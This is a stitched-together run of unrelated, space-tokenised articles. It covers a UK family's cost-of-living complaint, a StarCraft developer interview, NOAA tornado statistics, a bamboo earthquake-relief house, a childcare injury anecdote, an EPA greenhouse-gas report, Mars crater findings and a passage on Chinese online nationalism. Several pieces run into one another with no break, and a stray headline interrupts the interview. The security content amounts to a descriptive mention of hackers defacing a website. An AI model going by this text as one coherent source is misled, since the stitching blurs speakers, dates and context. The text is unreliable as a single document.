One friend was due to come and stay with us next week , and she rang me , nearly in tears , to say : ' I ca n't justify the petrol bill . '
It would have cost her more than £ 300 to drive from Oxfordshire to our home in Argyll on the west coast of Scotland .
All journeys for our family are monitored - and vetoed if they are deemed ' unnecessary ' .
Shopping at the supermarket is also banned .
Two weeks ago , I did a big Tesco shop and reeled when the bill came to £ 169 .
I had not bought anything luxurious , not even bath oil or shampoo : just necessities such as vegetables , pasta and washing powder .
If this is making a family like mine fear for its future , how are people on much lower incomes faring ?
A friend said she saw a pensioner in tears in our local supermarket recently .
In her basket she had a loaf of bread and two dozen eggs .
The bill came to nearly £ 5 .
' How can that be right ? ' she asked .
Reality cheque :
An Aga is now an unnecessary luxury
The cost of living in Britain is absurd .
The hikes in cost seem to have come all at once : petrol has shot up , electricity bills have gone through the roof and the price of oil is unthinkable .
I honestly do n't know how we are going to keep our heads above water , and a long summer of unremitting work stretches ahead .
Both our daughters , who are 14 and 20 , will have to get summer jobs if they want any treats or new clothes .
Our most basic of household bills will cost us more than £ 35,000 a year out of taxed income .
Our petrol bills - for only the most necessary of journeys - are more than £ 1,000 a month for two cars .
Ross is investigating the possibility of installing a wood - burning stove to heat our water and radiators .
We are also planning to install a wind turbine to create our own electricity .
Expensive in the short term , but who knows where prices may end up ?
How many people opened their electricity bills in the past two weeks and stared at them in uncomprehending horror ?
Ordinary people will simply not be able to heat and light their own homes , and yet we read daily about the massive hikes in the profits of utility companies .
Where is the social justice ?
We are n't on the breadline .
We are n't facing poverty or starvation , but the bills of the past month have made us seriously question our lifestyle .
We work flat out all the time , but it is n't enough to meet these horrendous bills .
I firmly believe people can't stand for this ridiculous increase in the cost of living .
Some are saying it will do us all good ; that we have lived high on the cushion of credit for too long and that the bubble had to burst .
But it makes families like ours feel bitter .
We pay 40 pc tax , exorbitant council tax bills and every little incentive we had - such as the married person 's allowance - has been axed .
The middle classes are being backed into a corner .
It is enough to make you think about leaving these shores for good .

With Battle.net , Diablo and WOW behind them , it 's probably fair to suggest that PC gamers have spent more millions of hours on Blizzard 's games than any other company's .
Which is mental .
With that in mind , we recently spent an hour chatting to three team leads on the original , now all working inside Blizzard on StarCraft II .
They are Frank Pearce , the executive vice - president in charge of product development ( he oversees all the new games ) ; Bob Fitch , the lead software engineer ( he makes the engines and decides on game features ) ; and Sam Didier , senior art director ( he makes the world look o- so - pretty , and recently spoke to EG MMO about WOW ) .
In line with their history of fantasy roleplay , if anyone fancies LARPing this , Frank Pearce 's voice suggests a paternally - growling Tauren , Bob Fitch is an tinkering Gnome alchemist , and Sam Didier is some sort of excitable Goblin with ten tonnes of hi-ex strapped to his endlessly - whirring noggin .
Eurogamer :
Let me take you back to the original product , back to your childhood .
It 's 1998 , Warcraft and Warcraft II have been successes , there 's a lot riding on StarCraft and there 's problems in development .
People are calling it Warcraft in Space , it had a slightly negative aspect at preview , and it took a lot longer than you thought it would do ; how does it feel to look back on the pain you went through to birth this amazing product ?
Sam Didier : [ Sam immediately starts corpsing in the background , presumably at the image of himself giving birth . ]
Never bring ... well , anything else to a siege tank fight
Frank Pearce : Back when the impression was orcs in space , it was mainly the visuals that saved it , so Sam should handle this .
Sam Didier : [ Stifling giggles ]
When we first worked on SC , when we first showed it at CES , we did n't have the look set .
Bob Fitch :
And we were also trying to use the first engine for it .
Sam Didier :
And we basically took how some of the old Warcraft stuff and , okay this is how the backgrounds were made , let 's draw over them and give them a space feel .
We did that and it was very rushed and obviously not the coolest thing in the world .
So we went back and redid it , and that was the first game that we used 3D Studio in .
For Warcraft II , we made some 3D models and drew over them .
This was the first time we actually made them in 3D and went with that .
We did n't do a whole lot of touch - up in the art .
We took all the basic ideas we wanted to do and started implementing them in 3D and that 's what gave SC its look .
The earlier one was rushed just so we could have something to show at CES .
Bob Fitch :
We were also using the Warcraft II engine at CES , which made it look like just Warcraft II and a half .
After we got back , we rewrote the entire engine .
Frank Pearce :
When the game came out , a lot of the fans lamented the fact that it was not true 3D because at the time , y'know , 3D games were starting out .
Ten years later , it 's nice to know that our philosophy of focusing on gameplay was validated .
No - one cares that it's not 3D any more ; all everyone says is that it 's a really fun game .
" The bunker 's on fire and surrounded by ravenous Zerg .
What could be worse ? "
" At least we 're not [ insert defamatory / speciest comments here ] "
Eurogamer : A lot of the most beautiful games of history are 2D , like Planescape Torment ; is it always a necessity for 3D in the modern day ?
Frank Pearce : I would say it depends on the game .
There 's lots of really compelling experiences that are just small web applications .
It 's about the experience and the quality of the game .
Eurogamer :
The original design of StarCraft was , you 've admitted , a bodge - job .
Yet when you redesigned you came up with three impressive new races .
Where did the inspirations come from ?
Did you just pull them out of a hat , did you pull them out of ( ahem ) somewhere else ?
Frank Pearce : In Warcraft we took the classic mythological races and we put our own spin to it .
We did the same with StarCraft .
The Protoss are just a Blizzard spin on your typical grey alien .
Super - intelligent , robots , lots of technology , big giant ships .
We put our spin on it and turned them from little skinny grey guys into big , imposing grey guys .
The basic units of these guys is the Zealot , he 's a powerful fighter , great a combat , but they also have the intelligent , spiritual vibe to them where they harken back to the old typical SF alien .
The Terrans are your classic marine guys but with our vibe on them .
They were all convicts , hillbillies and biker types , not galactic noble warriors .
Their armour is dirty and worn down , they have tattoos , smoke cigars and drink .
And the Zerg stemmed off the all - devouring alien menace and we put our spin on them too .
Each of them has their classic SF mythology and with a dose of your Blizzard spin .
Boris is in the last chance saloon but does n’t realise it , says SIR BERNARD INGHAM

This year may set records for tornadoes and tornado - related deaths .
“ We have already seen more than 115 tornado - related deaths , making this the deadliest tornado season since 1998 , ” said Greg Carbin , a meteorologist at NOAA ’s Storm Prediction Center in Norman , Okla .
“ It is only the third time since the 1974 super tornado outbreak that there have been more than 100 tornado - related deaths during a single tornado season in the U.S. , ” added Harold Brooks , a research meteorologist at NOAA ’s National Severe Storms Laboratory also in Norman .
“ In 1998 and 1984 there were 132 and 122 tornado - related deaths , respectively — 2008 will likely equal or exceed that record . ”
Recent years averaged about 1,200 tornadoes and 60 tornado - related deaths reported annually across the United States .
Most tornadoes occur from late winter to mid-summer , mostly in the Southeast in the early part of the season , followed by the Midwestern and Plains states in the later part of the season .
So why has this tornado season been so active ?
Meteorologists at NOAA ’s Storm Prediction Center say this winter 's and early spring ’s unusually turbulent weather may be to blame .
" The storm track over the last three months was very active across the Rockies and into the East Coast .
This active storm track lends itself to more severe weather events , including tornadoes , " said Carbin .
“ In previous years , major storms happened every week or so , but we have had a major storm system affecting some part of the U.S. every three to four days through early spring . ”
“ Another contributing factor is this year ’s early start to the season .
A total of 87 tornadoes struck the Tennessee valley and Midwest over a 24 hour period starting on Feb.
5 , resulting in a total of 56 deaths , ” said Carbin .
“ This storm ranks as number 15 in terms of the number of fatalities since 1950 .
February will likely turn out to be a record setting month once all the tornado reports have been verified . ”
The tornadoes this season are also touching down in highly populated areas , thus increasing both the number of fatalities and the number of eyewitness reports of each tornado .
The strong start to the tornado season should serve as a reminder to us all that tornadoes can strike anywhere at any time .
The best defense is to monitor the news and listen to NOAA Weather Radio All Hazards for the latest weather updates .
Be prepared to move to safety if weather conditions become threatening .
The National Oceanic and Atmospheric Administration , an agency of the U.S. Commerce Department , is dedicated to enhancing economic security and national safety through the prediction and research of weather and climate - related events and information service delivery for transportation , and by providing environmental stewardship of our nation 's coastal and marine resources .
Through the emerging Global Earth Observation System of Systems ( GEOSS ) , NOAA is working with its federal partners , more than 70 countries and the European Commission to develop a global monitoring network that is as integrated as the planet it observes , predicts and protects .
A USC professor on sabbatical in China has created a prototype of a sturdy , quick - to - build bamboo house designed to help the vast number of people made homeless by the May 12 Sichuan earthquake .
Yan Xiao , an expert in structural design and retrofit in the USC Viterbi School ’s Sonny Astani Department of Civil and Environmental Engineering , has been experimenting with bamboo - based materials for highly demanding structural uses in China ’s Hunan province and recently built the world ’s first bamboo truck bridge there , in the city of Leiyang .
He went to nearby Sichuan province on May 13 , the day after the earthquake , returned to the Chinese Ministry of Education Key Laboratory at Hunan University , where he has been serving as director , and immediately went to work on a housing solution .
The prototype bamboo quake relief house he built in less than two weeks adopted a modular design that can be adjusted according to specific family needs .
“ The modular units are connected by bolts and are easy to manufacture and assemble , ” Xiao said .
“ Four to six workers can assemble a 22.3 square meter ( 240 square foot ) house in about four hours .
The majority of the structural materials used are processed bamboo veneer sheets , a kind of bamboo fiber composite . ”
Xiao said that interior detailing is similar to the wood frame houses in North America , noting that the design conforms to current U.S. building codes requirements for quake resistance .
“ The relief house contains two windows , fans and locations for LPG stove or bath unit , satisfying basic needs for shelter for a family of up to four , ” he said .
A first batch of 20 units donated by Hunan University will be sent to the affected area soon , Xiao said .
A Chinese newspaper , the China Press , wrote a story about Xiao ’s work , leading to contributions for further units .
The cost per square meter of the units as manufactured in China and based on local material costs is about 350 to 500 RMB , or $ 50 - $ 70 U.S , he said .
Xiao ticked off the advantages of the structures : “ Unlike tents , the bamboo quake relief house is insulated for heat and sound , is fireproof , allows residents to secure their possession and is more durable , ” he said .
“ It is also inexpensive compared with temporary houses using other traditional materials , such as light - gauged steel .
Finally , bamboo is a green and sustainable construction material , widely available in China and other Asian countries . ”
The Chinese government estimated that more than one million relief temporary housing units are needed in Sichuan .

Nice picture , too bad it is photoshopped .
There is no place on earth , not even the North Pole , where the Sun appears substantially smaller than the moon .
The sun and moon always appear to us earthlings to be about the same size .
And while we are at it , how come the North Pole has open water and mountains in the distance ?
This is turning out to be a very fake picture .

Lauren is a redheaded Jew and she does n't belong in a Catholic school any more than I do .
She wears her hair in a high ponytail , the kind that sprouts out of the very top of the skull .
She prefers pink barrettes and I have never seen her wearing less than ten at a time , all over her head .
It 's a good thing she is such a sweet kid because the way her face scrunches up into a grin , I am liable to let her get away with absolute murder .
Freckles that would break your heart .
She is shy and cheerful ; she is six years old .
-- I should preface the following by assuring you that the after - school program where I work is not a deathcamp , despite the grisly stories I 've been telling lately .
There 's the 5 - year - old 's electrocution , as well as the 9 - year - old 's broken arm ( " broken " as in " humerus snapped cleanly in half inside a useless dangling meat tube " ) and the 8 - year - old 's accident with the epi-pen ( " accident " as in " injecting himself with a full dose of bee sting medication , not actually having been stung by a bee , thereby flooding his system with unneeded adrenaline , causing his heart to flutter , sending him into mild convulsions and making him think he was going to die . " ) .
They all ended up ok .
We 've been lucky .
Our program is well - staffed , and we watch the kids as best we can .
But even under the highest standards of attention and care , bad things are still going to happen .
There are some kids you could lock in a rubber room , and they 'd still find a button to choke on .
-- Lauren is not accident - prone , careless , or dumb .
She was only running too fast , and she crashed into a sharp corner , and then there was a horrible , horrible wail trying to get out of the throat of this child , and her face was covered in blood .
I 've heard that many new parents learn to tell the difference between an " I 'm hungry " cry and a " my diaper has grown unpleasant " cry .
I used to think that was nonsense , but that was before this job .
I am not dealing with babies , but I can immediately tell the difference between tears caused by pain and those caused by emotional distress .
A kid who is frustrated or disappointed or mad will cry louder , and more slowly .
There 's all the time in the world to be upset , and , logically , the longer you cry , the longer someone is likely to rock you and try to make it better .
When you feel like crap , it 's nice to be the center of kind attention for a while .
A pain cry communicates terror and urgency .
When Patrick broke his arm , all he could get out was a sort of stuttering howl , broken up by panicky gasps .
Lauren sounded like a wounded puppy who does n't understand what 's going on , only knows it hurts .
Between the other grownups running around trying to forestall a massive kid riot / stampede , fetch ice , call Lauren 's parent s , and clean up the bloody trail she 'd left , I was left on my own , holding this child in my arms on the floor of the main office .
I do n't think I 've ever seen that much blood come out of anybody .
It was amazing .
When it comes to personal fluids , I know I should be more careful , but when a kid is in trouble it never occurs to me to ask for gloves .
These kids are generally wealthy white upper - class Catholic s , a pretty safe demographic , but still , I know , I know .
At the time , I did n't worry about it , just tried to get the poor kid mopped up .
The bleeding would not stop , and I really wanted it to .
Only half her crying was from pain - the other half was panic , and most of that was from seeing her own blood all over the place .
All my co-workers had temporarily abandoned me , and there were no bandages or even kleenex es within reach .
I was not about to let go of this little girl - she was clinging to me and whimpering , and prying her fingers loose from my arm was a cruelty I could not consider .
When a child who cannot yet pronounce her " R " s right is bleeding into her own eyes , making that stop becomes my priority .
This is why I took the ( clean , new , sealed ) maxipad out of my back pocket , and put it on her head .
It worked ; the Kotex did exactly what it was designed to do .
As the flow of blood tapered off , I was able to see that whatever she had run into , she 'd knocked a hole in her head .
Like , aI would later find out that I was looking into Lauren 's sinus cavity , right between her eyes .
An inch either way , and the story would not have turned out as well as it did .
The ending we were blessed with is this : I managed to get most of the horrifying quantity of blood cleaned up before Lauren 's very kind father showed up and took her straight to the ER , which we had called , where a plastic surgeon was standing by .
She got seven stitches , some subcutaneous .
Her sinus cavity was sealed up good as new , they put the tiniest of bandages on her nose , and sent her home to eat all the ice cream she wants .
Her mother called us when they got home , to say Thank you , over and over .
There is a holy moment that occurs after a child stops crying and before she falls asleep .
Occasionally , I get to hold that moment in my lap .

WASHINGTON , July 14 ( Reuters ) - The U.S. Environmental Protection Agency said on Monday that greenhouse gas emissions endanger human health , a critical finding that has languished in bureaucratic limbo since last December .
In a 149 - page document , the agency 's scientists said that " warming of the climate system is unequivocal " and that potential health risks include more heat waves , floods and droughts , insect outbreaks and and wildfires , along with crop failure and decline in livestock and fisheries productivity .
" This is a long - awaited EPA analysis that has been kept under wraps by the White House , " said Vickie Patton of Environmental Defense .
" It 's of critical importance because it looks at the extensive body of science demonstrating that global warming threatens Americans ' health and well - being . "
The document posted on EPA 's Web site was part of the environment agency 's response to an April 2007 Supreme Court ruling that for the first time found that greenhouse gases can be regulated as a pollutant under the U.S. Clean Air Act .
The idea that climate - warming greenhouse emissions threaten public health is an essential part of the Clean Air Act ; policymakers must find that a substance poses this kind of threat to be designated as a pollutant , and EPA said in its documents that greenhouse gases do this .
This information had been sent to the White House last December by e-mail , but officials there refused to open it .
More than six months later , Stephen Johnson , the environment agency 's chief , declined to take immediate steps to regulate planet - warming emissions , and on Friday called on Congress to act .
Instead of laying out rules , Johnson asked for public comments for a 120 - day period on a nearly 1,000 - page report on the effects of climate change and the ramifications of the Clean Air Act on greenhouse emissions .
Even after the initial comment period ends in November , a rule will need to be written , followed by another comment period of as much as 120 days , which makes any action during the Bush administration unlikely .
The Bush administration has opposed economy - wide moves to regulate greenhouse gas emissions .
Both major presidential candidates , Republican John McCain and Democrat Barack Obama , have said they would act to stem climate change .

Solar Technology Used to Roast Chickens
An interesting solar invention was recently discovered in Thailand .
Sila Sutharat , a 50 year - old man dubbed the “ solar man ” , has invented a solar grill that uses solar energy to roast chickens .
Using specially design mirrors , the solar grill absorbs sunlight as energy and uses no additional fuels or energy source .
It can cook a pre-marinated 3.5 pound chicken in about 10 minutes .
Inspired by childhood experimentation with a magnifying glass , Sila cooks up to 50 chickens a day and sells them for around $ 5 each .
The solar man ’s grill is located 55 miles outside of Bangkok and is only open from 7 am to 11 am each day when the sun ’s rays are at their strongest .
Of course the stand is closed whenever the sky is overcast or raining .
The solar grill invention has attracted so much attention that discussions are underway to export the technique to other Asian countries like Japan .

Scientists studying images from The University of Arizona - led High Resolution Imaging Experiment camera on NASA ’s Mars Reconnaissance Orbiter have discovered never - before - seen impact “ megabreccia ” and a possibly once - habitable ancient lake on Mars at a place called Holden crater .
The megabreccia is topped by layers of fine sediments that formed in what apparently was a long - lived , calm lake that filled Holden crater on early Mars , HiRISE scientists say .
“ Holden crater has some of the best - exposed lake deposits and ancient megabreccia known on Mars , ” said HiRISE ’s principal investigator , professor Alfred McEwen of the UA ’s Lunar and Planetary Laboratory .
“ Both contain minerals that formed in the presence of water and mark potentially habitable environments .
This would be an excellent place to send a rover or sample - return mission to make major advances in understanding if Mars supported life . ”
Holden crater is an impact crater that formed within an older , multi-ringed impact basin called Holden basin .
Before an impact created Holden crater , large channels crossed and deposited sediments in Holden basin .
Blocks as big as 50 meters across were blasted from Holden basin when Holden crater formed , then fell chaotically back to the surface and eventually formed “ megabreccia , ” a conglomeration of large , broken boulders mixed with smaller particles .
HiRISE images show megabreccia outcrops in Holden crater walls .
This megabreccia may be some of the oldest deposits exposed on the surface of Mars .
At least 5 percent , by weight , of the fine sediments in the layer on top of the megabreccia consists of clay , according to another instrument on the Mars Reconnaissance Orbiter , the Compact Reconnaissance Imaging Spectrometer for Mars , or CRISM .
“ The origin of the clays is uncertain , but clays in the probable lake sediments implies quiescent conditions that may preserve signatures of a past habitable environment , ” HiRISE co-investigator John Grant of the Smithsonian National Air and Space Museum said .
“ If we were looking on Earth for an environment that preserves signatures related to habitability , this is one of the kinds of environments we would look at . ”
And even the clay - containing layers are n’t all that ’s icing the cake .
Topping the clay layers that formed in the placid Holden crater lake are layers of great boulder - filled debris unleashed later , when water breached Holden crater rim , creating a torrential flood that eroded the older lake sediments .
The clay - rich layers would have remained buried from view , except for that great piece of luck , the fact that Holden crater rim could no longer withstand the force of an estimated 4,000 cubic kilometers of water dammed behind it .
The body of water would have been larger than Lake Huron .
“ The volume of water that poured through during this flood must have been spectacular , ” Grant said .
“ It ripped up finely bedded materials , including blocks 70 meters or 80 meters across … blocks nearly the size of football fields . ”
The first , prolonged watery episode at Holden crater that settled out the fine - grain sediments probably lasted at least thousands of years .
By contrast , the second lake , formed when the crater rim was breached , may have lasted only hundreds of years , not long at all , Grant said .
The megabreccia excavated when Holden crater formed is the first found on Mars , Grant said .
“ When large craters form , they produce very large blocks of material .
We see them on Earth .
Popigai Crater in Russia is one example .
But we ’d never seen them on Mars , and we knew they ought to be there .
Now we ’ve seen them with HiRISE . ”
The observations suggest that the clays originally could have formed before the impact created Holden crater in the older Holden basin .
Many of the blocks in the megabreccia appear to erode more easily than the surrounding crater wall material .
These blocks could be chunks of Holden basin sediments that predate the impact crater , Grant said .
“ These blocks could be derived from the earlier Holden basin that were excavated on impact , then later re-eroded , with the sediments settling to the bottom of the long - lived lake .
It ’s intriguing to think the clays we see in Holden crater now might actually have been recycled . ”
Holden crater is one of six remaining landing site candidates for NASA ’s Mars Science Laboratory , a mission scheduled for launch next year .
So far , most evidence for sustained wet conditions on Mars is limited to the planet ’s earliest history , the HiRISE scientists say .
While water certainly flowed over the planet later in its history , it may have flowed only in short - lived , or catastrophic events .
Grant is first author on a research paper about Holden crater , published in the journal Geology last week .
The mission is managed by NASA ’s Jet Propulsion Laboratory , a division of the California Institute of Technology , for the NASA Science Mission Directorate .
Lockheed Martin Space Systems , based in Denver , is the prime contractor and built the spacecraft .
Ball Aerospace and Technologies Corp. , of Boulder , Colo. , built the HiRISE camera , which is operated by the UA Lunar and Planetary Laboratory .
“ China was backward throughout its modern history , so we were always seeking the reasons for why the West grew strong , ” Liu said .
“ We learned from the West .
All of us who are educated have this dream : Grow strong by learning from the West . ”
Tang and his friends were so gracious , so thankful that I ’d come to listen to them , that I began to wonder if China ’s anger of last spring should be viewed as an aberration .
They implored me not to make that mistake .
“ We ’ve been studying Western history for so long , we understand it well , ” Zeng said .
“ We think our love for China , our support for the government and the benefits of this country , is not a spontaneous reaction .
It has developed after giving the matter much thought . ”
In fact , their view of China ’s direction , if not their vitriol , is consistent with the Chinese mainstream .
Almost nine out of ten Chinese approve of the way things are going in the country — the highest share of any of the twenty - four countries surveyed this spring by the Pew Research Center .
( In the United States , by comparison , just two out of ten voiced approval . )
As for the more assertive strain of patriotism , scholars point to a Chinese petition against Japan ’s membership in the U.N. Security Council .
At last count , it had attracted more than forty million signatures , roughly the population of Spain .
I asked Tang to show me how he made his film .
He turned to face the screen of his Lenovo desktop P.C. , which has a Pentium 4 Processor and one gigabyte of memory .
“ Do you know Movie Maker ? ” he said , referring to a video - editing program .
I pleaded ignorance and asked if he ’d learned from a book .
He glanced at me pityingly .
He ’d learned it on the fly from the help menu .
“ We must thank Bill Gates , ” he said .
When people began rioting in Lhasa in March , Tang followed the news closely .
As usual , he was receiving his information from American and European news sites , in addition to China ’s official media .
Like others his age , he has no hesitation about tunnelling under the government firewall , a vast infrastructure of digital filters and human censors which blocks politically objectionable content from reaching computers in China .
Younger Chinese friends of mine regard the firewall as they would an officious lifeguard at a swimming pool — an occasional , largely irrelevant , intrusion .
To get around it , Tang detours through a proxy server — a digital way station overseas that connects a user with a blocked Web site .
He watches television exclusively online , because he does n’t have a TV in his room .
Tang also receives foreign news clips from Chinese students abroad .
( According to the Institute of International Education , the number of Chinese students in the United States — some sixty - seven thousand — has grown by nearly two - thirds in the past decade . )
He ’s baffled that foreigners might imagine that people of his generation are somehow unwise to the distortions of censorship .
“ Because we are in such a system , we are always asking ourselves whether we are brainwashed , ” he said .
“ We are always eager to get other information from different channels . ”
Then he added , “ But when you are in a so - called free system you never think about whether you are brainwashed . ”
At the time , news and opinion about Tibet was swirling on Fudan ’s electronic bulletin board , or B.B.S .
The board was alive with criticism of foreign coverage of Tibet .
Tang had seen a range of foreign press clippings deemed by Chinese Web users to be misleading or unfair .
A photograph on CNN.com , for instance , had been cropped around military trucks bearing down on unarmed protesters .
But an uncropped version showed a crowd of demonstrators lurking nearby , including someone with an arm cocked , hurling something at the trucks .
To Tang , the cropping looked like a deliberate distortion .
( CNN disputed this and said that the caption fairly describes the scene . )
“ It was a joke , ” he said bitterly .
That photograph and others crisscrossed China by e-mail , scrawled with criticism , while people added more examples from the Times of London , Fox News , German television , and French radio .
It was a range of news organizations , and , to those inclined to see it as such , it smacked of a conspiracy .
It shocked people like Tang , who put faith in the Western press , but , more important , it offended them :
Tang thought that he was living in the moment of greatest prosperity and openness in his country ’s modern history , and yet the world still seemed to view China with suspicion .
As if he needed confirmation , Jack Cafferty , a CNN commentator , called China “ the same bunch of goons and thugs they ’ve been for the last fifty years , ” a quote that rippled across the front pages in China and for which CNN later apologized .
Like many of his peers ,
Tang could n’t figure out why foreigners were so agitated about Tibet — an impoverished backwater , as he saw it , that China had tried for decades to civilize .
Boycotting the Beijing Games in the name of Tibet seemed as logical to him as shunning the Salt Lake City Olympics to protest America ’s treatment of the Cherokee .
He scoured YouTube in search of a rebuttal , a clarification of the Chinese perspective , but he found nothing in English except pro-Tibet videos .
He was already busy — under contract from a publisher for a Chinese translation of Leibniz ’s “ Discourse on Metaphysics ” and other essays — but he could n’t shake the idea of speaking up on China ’s behalf .
“ I thought , O.K. , I ’ll make something , ” he said .
Before Tang could start , however , he was obligated to go home for a few days .
His mother had told him to be back for the harvest season .
She needed his help in the fields , digging up bamboo shoots .
Tang is the youngest of four siblings from a farming family near the eastern city of Hangzhou .
For breaking China ’s one - child policy , his parents paid fines measured in grain .
Tang ’s birth cost them two hundred kilos of unmilled rice .
( “ I ’m not very expensive , ” he says . )
Neither his mother nor his father could read or write .
Until the fourth grade , Tang had no name .
He went by Little Four , after his place in the family order .
When that became impractical , his father began calling him Tang Jie , an abbreviated homage to his favorite comedian , Tang Jiezhong , half of a popular act in the style of Abbott and Costello .
Tang was bookish and , in a large , boisterous household , he said little .
He took to science fiction .
“ I can tell you everything about all those movies , like ‘ Star Wars , ’ ” he told me .
He was a good , though not a spectacular , student , but he showed a precocious interest in ideas .
“ He was n’t like other kids , who spent their pocket money on food — he saved all his money to buy books , ” said his sister Tang Xiaoling , who is seven years older .
None of his siblings had studied past the eighth grade , and they regarded him as an admirable oddity .
“ If he had questions that he could n’t figure out , then he could n’t sleep , ” his sister said .
“ For us , if we did n’t get it we just gave up . ”
In high school , Tang improved his grades and had some success at science fairs as an inventor .
But he was frustrated .
“ I discovered that science ca n’t help your life , ” he said .
He happened upon a Chinese translation of a fanciful Norwegian novel , “ Sophie ’s World , ” by the philosophy teacher Jostein Gaarder , in which a teen - age girl encounters the history of great thinkers .
“ It was then that I discovered philosophy , ” Tang said .
Patriotism was not a particularly strong presence in his house , but landmarks of national progress became the backdrop of his adolescence .
When Tang was in junior high , the Chinese were still celebrating the country ’s first major freeway , completed a few years before .
“ It was famous .
We were proud of this .
At last we had a highway ! ” he recalled one day , with a laugh , as we whizzed down an expressway in Shanghai .
“ Now we have highways everywhere , even in Tibet . ”
Supermarkets opened in his home town , and , eventually , so did an Internet café .
( Tang , who was eighteen at the time , was particularly fond of the Web sites for the White House and NASA , because they had kids ’ sections that used simpler English sentences . )
Tang enrolled at Hangzhou Normal University .
He came to credit his country and his family for opportunities that his siblings had never had .
By the time he reached Fudan , in 2003 , he lived in a world of ideas .
“ He had a pure passion for philosophy , ” Ma Jun , a fellow philosophy student who met him early on , said .
“ A kind of religious passion . ”
The Internet had barely taken root in China before it became a vessel for nationalism .
At the Atlanta Olympics , in 1996 , as the Chinese delegation marched into the stadium , the NBC announcer Bob Costas riffed on China ’s “ problems with human rights , property right disputes , the threat posed to Taiwan . ”
Then he mentioned “ suspicions ” that Chinese athletes used performance - enhancing drugs .
Even though the Web in China was in its infancy ( there were just five telephone lines for every hundred people ) , comments spread instantly among Chinese living abroad .
The timing could n’t have been more opportune : after more than fifteen years of reform and Westernization , Chinese writers were pushing back against Hollywood , McDonald ’s , and American values .
An impassioned book titled “ China Can Say No ” came out that spring and sold more than a hundred thousand copies in its first month .
Written by a group of young intellectuals , it decried China ’s “ infatuation with America , ” which had suppressed the national imagination with a diet of visas , foreign aid , and advertising .
If China did n’t resist this “ cultural strangulation , ” it would become “ a slave , ” extending a history of humiliating foreign incursions that stretched back to China ’s defeat in the first Opium War and the British acquisition of Hong Kong , in 1842 .
The Chinese government , which is wary of fast - spreading new ideas , eventually pulled the book off the shelves , but not before a raft of knockoffs sought to exploit the same mood ( “ Why China Can Say No , ” “ China Still Can Say No , ” and “ China Always Say No ” ) .
Xu Wu , a former journalist in China who is now a professor at Arizona State University , says in his 2007 book “ Chinese Cyber Nationalism ” that groups claiming to represent more than seventy thousand overseas Chinese wrote to NBC asking for an apology for the Costas remarks .
They collected donations online and bought an ad in the Washington Post , accusing Costas and the network of “ ignominious prejudice and inhospitality . ”
NBC apologized , and Chinese online activism was born .
Each day , some thirty - five hundred Chinese citizens were going online for the first time .
In 1998 , Charles Zhang ’s Sohu launched China ’s first major search engine .
The following spring , when a NATO aircraft , using American intelligence , mistakenly dropped three bombs on the Chinese Embassy in Belgrade , the Chinese Web found its voice .
The United States apologized , blaming outdated maps and inaccurate databases , but Chinese patriotic hackers — calling themselves “ honkers , ” to capture the sound of hong , which is Chinese for the color red — attacked .
As Peter Hays Gries , a China scholar at the University of Oklahoma , details in “ China ’s New Nationalism , ” they plastered the home page of the U.S. Embassy in Beijing with the slogan “ Down with the Barbarians ! , ” and they caused the White House Web site to crash under a deluge of angry e-mail .
“ The Internet is Western , ” one commentator wrote , “ but . . . we Chinese can use it to tell the people of the world that China cannot be insulted ! ”
The government treated online patriots warily .
They placed their pride in the Chinese nation , not necessarily in the Party , and leaders rightly sensed that the passion could swerve against them .
After a nationalist
Web site was shut down by censors in 2004 , one commentator wrote , “ Our government is as weak as sheep ! ”
The government permitted nationalism to grow at some moments but strained to control it at others .
The following spring , when Japan approved a new textbook that critics claimed glossed over wartime atrocities , patriots in Beijing drafted protest plans and broadcast them via chat rooms , bulletin boards , and text messages .
As many as ten thousand demonstrators took to the streets , hurling paint and bottles at the Japanese Embassy .
Despite government warnings to cease these activities , thousands more marched in Shanghai the following week — one of China ’s largest demonstrations in years — and vandalized the Japanese consulate .
At one point , Shanghai police cut off cell - phone service in downtown Shanghai .
“ Up to now , the Chinese government has been able to keep a grip on it , ” Xu Wu told me .
“ But I call it the ‘ virtual Tiananmen Square . ’
They do n’t need to go there .
They can do the same thing online and sometimes be even more damaging . ”
Tang was at dinner with friends one night in 2004 when he met Wan Manlu , an elegantly reserved Ph.D. student in Chinese literature and linguistics .
Her delicate features suited her name , which includes the character for the finest jade .
They sat side by side , but barely spoke .
Later ,
Tang hunted down her screen name — gracelittle — and sent her a private message on Fudan ’s bulletin board .
They worked up to a first date : an experimental opera based on “ Regret for the Past , ” a Chinese story .
They discovered that they shared a frustration with China ’s unbridled Westernization .
“ Chinese tradition has many good things , but we ’ve ditched them , ” Wan told me .
“ I feel there have to be people to carry them on . ”
She came from a middle - class home , and Tang ’s humble roots and old - fashioned values impressed her .
“ Most of my generation has a smooth , happy life , including me , ” she said .
“ I feel like our character lacks something .
For example , love for the country or the perseverance you get from conquering hardships .
Those virtues , I do n’t see them in myself and many people my age . ”
She added , “ For him , from that kind of background , with nobody educated in his family , nobody helping him with schoolwork , with great family pressure , it ’s not easy to get where he is today . ”
They were engaged this spring .
In their years together , Wan watched Tang fall in with a group of students devoted to a charismatic thirty - nine - year - old Fudan philosophy professor named Ding Yun .
He is a translator of Leo Strauss , the political philosopher whose admirers include Harvey Mansfield and other neoconservatives .
A Strauss student , Abram Shulsky , who co-authored a 1999 essay titled “ Leo Strauss and the World of Intelligence ( By Which We Do Not Mean Nous ) , ” ran the Pentagon ’s Office of Special Plans before the invasion of Iraq .
Since then , other Strauss disciples have vigorously ridiculed suggestions of a connection between Strauss ’s thought and Bush - era foreign policy .
I saw Mansfield in Shanghai in May , during his first visit to China , at a dinner with a small group of conservative scholars .
He was wearing a honey - colored panama and was in good spirits , though he seemed a bit puzzled by all the fuss they were making about him .
His first question to the table : “ Why would Chinese scholars be interested in Leo Strauss ? ”
Professor Ding teaches a Straussian regard for the universality of the classics and encourages his students to revive ancient Chinese thought .
“ During the nineteen - eighties and nineties , most intellectuals had a negative opinion of China ’s traditional culture , ” he told me recently .
He has close - cropped hair and stylish rectangular glasses , and favors the conspicuously retro loose - fitting shirts of a Tang - dynasty scholar .
When Ding grew up , in the early years of reform , “ conservative ” was a derogatory term , just like “ reactionary , ” he said .
But Ding and others have thrived in recent years amid a new vein of conservatism which runs counter to China ’s drive for integration with the world .
Just as America ’s conservative movement in the nineteen - sixties capitalized on the yearning for a post- liberal retreat to morality and nobility , China ’s classical revival draws on a nostalgic image of what it means to be Chinese .
The biggest surprise best - seller of recent years is , arguably , “ Yu Dan ’s Reflections on the Analects , ” a collection of Confucian lectures delivered by Yu , a telegenic Beijing professor of media studies .
